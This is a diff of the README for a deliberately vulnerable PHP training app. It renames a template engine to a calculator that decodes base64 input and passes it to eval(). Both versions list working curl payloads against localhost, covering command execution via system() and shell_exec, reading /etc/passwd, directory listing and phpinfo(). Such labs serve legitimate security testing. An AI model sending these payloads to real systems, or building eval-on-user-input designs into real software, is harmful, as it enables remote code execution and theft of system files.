@@ -1,63 +1,52 @@
-# QuickReport — Vulnerable Template Engine
+# CalcAPI — Vulnerable Expression Evaluator
 
-Deliberately vulnerable PHP application for security testing. A "template engine" that accepts base64-encoded templates and executes them via `eval()`.
+Deliberately vulnerable PHP app for security testing. A calculator that accepts base64-encoded math expressions and evaluates them via `eval()`.
 
-> **WARNING**: This app is intentionally vulnerable. Run it only in Docker for isolation. Never expose it to the internet.
+> **WARNING**: Intentionally vulnerable. Run only in Docker. Never expose to the internet.
 
 ## Setup
 
 ```bash
-docker build -t quickreport .
-docker run --rm -p 8080:8080 quickreport
+docker compose up --build
 ```
 
-Open http://localhost:8080
+Open http://localhost:9009
 
 ## How it works
 
-1. User writes an HTML template with PHP expressions like `<?= date('Y-m-d') ?>`
-2. The template is base64-encoded and sent via POST
-3. The server decodes the base64 and passes it to `eval()`
-4. The rendered output is returned
+1. User types a math expression (e.g. `(12 + 8) * 3 / 2`)
+2. The frontend base64-encodes it (avoids issues with `+`, `*`, `/`, `<`, `>` in form data)
+3. The server decodes the base64 and runs `eval('return ' . $expr . ';')`
+4. The result is returned
 
-The **legitimate use case** for base64: safely transporting HTML with special characters and embedded PHP tags over HTTP without encoding issues.
+**Why base64**: Characters like `+` and `&` have special meaning in URL/form encoding and would be mangled without base64.
 
-The **vulnerability**: `eval('?>' . $template)` in `render.php` executes any PHP code that comes out of the base64 decode — no sanitization, no allowlist.
+**The vulnerability**: `eval()` in `eval.php` executes arbitrary PHP, not just math.
 
-## Testing payloads
-
-### Via curl
+## Example payloads
 
 ```bash
-# Server info
-PAYLOAD=$(echo -n '<?php phpinfo(); ?>' | base64)
-curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"
+# Normal math
+echo -n '(12 + 8) * 3 / 2' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"
 
 # Command execution
-PAYLOAD=$(echo -n '<?php echo shell_exec("whoami"); ?>' | base64)
-curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"
+echo -n 'system("whoami")' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"
 
 # Read files
-PAYLOAD=$(echo -n '<?php echo file_get_contents("/etc/passwd"); ?>' | base64)
-curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"
+echo -n 'file_get_contents("/etc/passwd")' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"
 
 # List directory
-PAYLOAD=$(echo -n '<?php echo implode("\n", scandir("/")); ?>' | base64)
-curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"
+echo -n 'implode("\n", scandir("/"))' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"
 
-# Backtick shorthand
-PAYLOAD=$(echo -n '<?= `ls -la /` ?>' | base64)
-curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"
+# PHP info
+echo -n 'phpinfo()' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"
 ```
-
-### Via the web UI
-
-Paste any of the above PHP snippets (without base64 encoding) into the "Template" text area and click **Render Template** — the UI encodes it automatically.
 
 ## Files
 
 | File | Purpose |
 |------|---------|
-| `index.php` | Frontend with template editor and auto-base64 encoding |
-| `render.php` | Backend — decodes base64 and `eval()`s it (the vulnerable endpoint) |
-| `Dockerfile` | PHP 8.3 built-in server on port 8080 |
+| `index.php` | Frontend calculator UI |
+| `eval.php` | Backend — decodes base64 and `eval()`s it |
+| `Dockerfile` | PHP 8.3 built-in server |
+| `docker-compose.yml` | Run on port 9009 |
